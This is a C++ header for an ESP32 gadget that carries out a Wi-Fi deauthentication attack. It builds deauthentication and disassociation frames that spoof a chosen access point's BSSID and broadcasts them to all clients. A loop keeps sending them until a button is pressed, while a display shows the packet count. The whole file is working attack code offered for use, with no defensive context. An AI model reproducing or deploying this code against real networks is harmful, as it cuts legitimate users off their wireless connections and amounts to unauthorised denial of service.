#pragma once

#include "utils.hpp"

bool WiFi_SendDeauthPacket(uint8_t* bssid, uint8_t chan = 1)
{
    esp_wifi_set_channel(chan, WIFI_SECOND_CHAN_NONE);
    uint8_t packet[26];
    memcpy(packet, deauth_frame_default, 26);

    uint8_t ap[6];
    memset(ap, 0xff, sizeof(ap));

    memcpy(&packet[4], ap, 6);
    memcpy(&packet[10], bssid, 6);
    memcpy(&packet[16], bssid, 6);
    packet[24] = 1;
    
    bool status = false;

    if (esp_wifi_80211_tx(WIFI_IF_AP, packet, 26, false) == ESP_OK)
    {
        status = true;
    }

    packet[0] = 0xA0;
    if (esp_wifi_80211_tx(WIFI_IF_AP, packet, 26, false) == ESP_OK)
    {
        status = true;
    }

    return status;
}

void WiFi_DeauthAP(const uint8_t* bssid, String ap_name, uint8_t chan = 1)
{
    int packets = 0;

    while (!ReadButton(BUTTON_CENTER))
    {
        if (WiFi_SendDeauthPacket((uint8_t*)bssid, chan))
        {
            packets++;
        }

        String text = ap_name;
        String text2 = "Packets sent: " + String(packets);
        const char* text_c = text.c_str();
        const char* text2_c = text2.c_str();

        display.clearDisplay();
        display.drawRect(0, 0, display.width(), display.height(), WHITE);
        display.setTextSize(1);
        display.setTextColor(WHITE);
        display.setCursor(10, display.height() / 2);
        display.print(text_c);
        display.setCursor(10, display.height() / 2 + 12);
        display.print(text2_c);
        display.display();

        delay(10);
    }

    HaltTillRelease(BUTTON_CENTER);
}
